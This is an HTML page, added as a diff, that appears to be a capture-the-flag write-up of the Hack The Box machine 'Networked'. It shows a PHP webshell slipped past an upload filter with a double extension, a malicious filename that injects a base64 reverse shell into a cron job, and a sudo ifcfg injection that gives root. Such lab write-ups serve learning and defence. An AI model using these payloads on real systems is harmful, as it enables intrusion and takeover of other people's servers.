@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Networked &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Networked</h1>
+    
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Apache</span><span class="tag">php</span><span class="tag">UploadBypass</span><span class="tag">CMDInjection</span><span class="tag">cron</span><span class="tag">ifcfg</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#double-extension-upload-bypass">Double-Extension Upload Bypass</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#cron-filename-command-injection-guly">Cron + Filename Command Injection → guly</a><a class="lvl3" href="#sudo-ifcfg-script-root">sudo ifcfg Script → Root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Networked is a medium Linux box that's a clinic in input-validation failures. The foothold is a <strong>double-extension file upload bypass</strong> that smuggles a PHP webshell past an image filter. Then a <code>cron</code> job's PHP source has a command-injection flaw triggered by a malicious <em>filename</em>, moving me to <code>guly</code>. Root comes from a <code>sudo</code> network-config script vulnerable to the classic ifcfg "space = command" injection.</p>
+<h2 id="recon">Recon</h2>
+<p>A <code>/backup</code> directory served a tar of the site's PHP source, invaluable, because I can read the upload filter instead of guessing it. The app exposes <code>/upload.php</code> (validated against an image-extension allowlist) and <code>/photos.php</code> (displays uploads).</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="double-extension-upload-bypass">Double-Extension Upload Bypass</h3>
+<p>The filter checks both extension and MIME type against <code>.jpg/.png/.gif/.jpeg</code>. Pure PHP uploads failed. So I embedded a webshell inside a real PNG and named it <code>.php.png</code>:</p>
+<pre><code class="language-php">&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
+</code></pre>
+<blockquote>
+<p><strong>Why <code>.php.png</code> works here:</strong> the filter only checks that the name <em>ends</em> in a valid image extension and that the MIME is an image, both satisfied by a genuine PNG carrying PHP in its bytes. But Apache on this box is configured to execute anything with <code>.php</code> anywhere in the name. So the file passes validation as an image yet runs as PHP. Serving it from <code>/uploads</code> (not the rendering <code>/photos.php</code>) executes the embedded code.</p>
+</blockquote>
+<pre><code>http://10.129.217.19/uploads/10_10_14_167.php.png?cmd=id   -&gt;   uid=48(apache)
+</code></pre>
+<p>A URL-encoded <code>mkfifo</code> reverse shell in the <code>cmd</code> parameter gave a shell as <code>apache</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="cron-filename-command-injection-guly">Cron + Filename Command Injection → guly</h3>
+<p>A cron-run <code>check_attack.php</code> cleans the uploads directory every few minutes. Reading its source (from the backup) revealed the flaw:</p>
+<pre><code class="language-php">exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);
+</code></pre>
+<blockquote>
+<p><strong>The injection:</strong> <code>$value</code> is a <em>filename</em> from the uploads directory, interpolated unsanitized into <code>exec()</code>. Any upload whose name isn't a valid IP gets passed through. So a file <em>named</em> with shell metacharacters becomes a command when cron runs <code>rm</code> on it.</p>
+</blockquote>
+<p>I created a file whose name is a base64-decoded reverse shell:</p>
+<pre><code class="language-sh">touch '/var/www/html/uploads/a; echo &lt;b64-nc-shell&gt; | base64 -d | sh; b'
+</code></pre>
+<p>When cron fired, the shell landed as <code>guly</code>.</p>
+<h3 id="sudo-ifcfg-script-root">sudo ifcfg Script → Root</h3>
+<pre><code class="language-sh">sudo -l
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+</code></pre>
+<p>The script writes an <code>ifcfg-guly</code> network-config file from interactive input, with only a loose regex filter that <em>allows spaces</em>.</p>
+<blockquote>
+<p><strong>The ifcfg bug (<a href="https://seclists.org/fulldisclosure/2019/Apr/24">Full Disclosure 2019</a>):</strong> in RHEL/CentOS network scripts, a config line <code>NAME=value</code> is sourced by the shell. Anything after a space in the value is executed as a command when the interface comes up. The script runs <code>ifup</code> as root (<code>#!/bin/bash -p</code> preserves privileges), so injecting <code>a /bin/bash</code> as a value spawns a root shell.</p>
+</blockquote>
+<pre><code class="language-sh">sudo /usr/local/sbin/changename.sh
+interface PROXY_METHOD: a /bin/bash
+# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Read the source when you can.</strong> The <code>/backup</code> tar exposed both the upload filter and the cron flaw.</li>
+<li><strong>Double extensions defeat naive upload filters</strong> when the web server executes on a substring match.</li>
+<li><strong>Filenames are user input.</strong> Interpolating a filename into <code>exec()</code> is command injection.</li>
+<li><strong>ifcfg values execute after a space</strong>, a long-standing RHEL network-script privesc.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
